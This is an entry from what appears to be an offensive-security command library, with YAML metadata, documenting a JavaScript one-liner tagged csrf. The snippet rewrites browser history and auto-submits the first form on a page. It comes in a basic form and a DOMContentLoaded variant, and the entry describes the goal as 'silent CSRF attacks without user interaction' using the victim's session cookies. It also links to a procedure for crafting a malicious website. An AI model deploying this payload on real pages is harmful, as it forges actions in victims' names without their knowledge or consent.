---
data: 'history.pushState('''','''',''/''); document.forms[0].submit();'
tags:
  - csrf
  - auto-submit
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:25.162Z'
id: 37b6f2ca-be7d-40dd-b82c-c376be37beb7
verified: false
validated: true
submitted: true
---
# form-auto-submit

## Command

```javascript
history.pushState('','','/'); document.forms[0].submit();
```

## Description

This JavaScript auto-submits the first form on a page while updating the browser history to prevent navigation, enabling silent CSRF attacks without user interaction or page reload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| history.pushState('','','/') | Updates URL to current path without reload | Yes |
| document.forms[0].submit() | Submits the first form element | Yes |

## Examples

### Basic Usage

```javascript
history.pushState('','','/'); document.forms[0].submit();
```

### Advanced Usage

```javascript
document.addEventListener('DOMContentLoaded', () => { history.pushState(null, null, '/'); document.forms[0].submit(); });
```

## Expected Output

Form data posted to the target endpoint (e.g., /alerts) using current session cookies, with no visible change to the page.

## Related

- [[commands/xss-payload-injection]]
- [[procedures/Craft-Malicious-Website-for-CSRF-Exploitation]]
